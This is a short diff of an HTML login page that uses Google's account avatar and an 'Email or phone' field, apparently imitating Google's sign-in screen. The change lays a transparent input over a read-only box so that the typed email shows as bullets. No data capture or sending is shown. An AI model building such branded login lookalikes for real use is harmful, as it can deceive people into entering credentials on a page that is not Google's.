@@ -18,7 +18,10 @@
         <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
       </div>
       <br>
-      <input id="inputField" placeholder="Email or phone">
+      <div style="position:relative;">
+        <input readonly type="text" id="Bullets" />
+        <input id="inputField" type="text" style="position:absolute;left:0px;top:0px;opacity:0;" onkeyup="document.getElementById('Bullets').value=this.value.replace(/(.)/g,'•');" />
+      </div>
       <br><br>
       <a href="#">
         <div id="loginButton" class="button">
